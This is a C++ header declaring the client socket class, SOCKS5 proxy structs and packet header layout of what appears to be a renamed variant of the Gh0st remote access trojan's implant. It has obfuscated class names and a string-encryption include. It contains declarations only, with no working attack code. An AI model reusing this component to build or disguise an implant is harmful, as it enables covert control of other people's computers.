// ClientSocket.h: interface for the CClientSocket class.
//
//////////////////////////////////////////////////////////////////////

#if !defined(AFX_CLIENTSOCKET_H__1902379A_1EEB_4AFE_A531_5E129AF7AE95__INCLUDED_)
#define AFX_CLIENTSOCKET_H__1902379A_1EEB_4AFE_A531_5E129AF7AE95__INCLUDED_
#include <winsock2.h>
#include <mswsock.h>
#include "common/Buffer.h"	// Added by ClassView
#include "common/Manager.h"
#include "StrCry.h"
#if _MSC_VER > 1000
#pragma once
#endif // _MSC_VER > 1000

// Change at your Own Peril

// 'G' 'h' '0' 's' 't' | PacketLen | UnZipLen
//'p', 'r', 'i', 'v', 'a', 'c', 'y'
#define HDR_SIZE	15
#define FLAG_SIZE	7



struct socks5req1
{
    char Ver;
    char nMethods;
    char Methods[2];
};

struct socks5ans1
{
    char Ver;
    char Method;
};

struct socks5req2
{
    char Ver;
    char Cmd;
    char Rsv;
    char Atyp;
    unsigned long IPAddr;
    unsigned short Port;
    
	//    char other[1];
};

struct socks5ans2
{
    char Ver;
    char Rep;
    char Rsv;
    char Atyp;
    char other[1];
};

struct authreq
{
    char Ver;
    char Ulen;
    char NamePass[256];
};

struct authans
{
    char Ver;
    char Status;
};

class privatra
{
	friend class Cprotm;
public:
	Cexceot m_CompressionBuffer;
	Cexceot m_DeCompressionBuffer;
	Cexceot m_WriteBuffer;
	Cexceot	m_ResendWriteBuffer;
	void Disconnect();
	bool Connect(LPCTSTR lpszHost, UINT nPort);
	int Send(LPBYTE lpData, UINT nSize);
	void OnRead(LPBYTE lpBuffer, DWORD dwIoSize);
	void setManagerCallBack(Cprotm*pManager);

	void run_event_loop();
	bool IsRunning();

	HANDLE m_hWorkerThread;
	SOCKET m_Socket;
	HANDLE m_hEvent;

	privatra();
	virtual ~privatra();
private:

	BYTE	m_bPacketFlag[FLAG_SIZE];

	static DWORD WINAPI WorkThread(LPVOID lparam);
	int SendWithSplit(LPBYTE lpData, UINT nSize, UINT nSplitSize);
	bool m_bIsRunning;
	Cprotm*m_pManager;  //---查看CManager 类的OnReceive函数

};

#endif // !defined(AFX_CLIENTSOCKET_H__1902379A_1EEB_4AFE_A531_5E129AF7AE95__INCLUDED_)
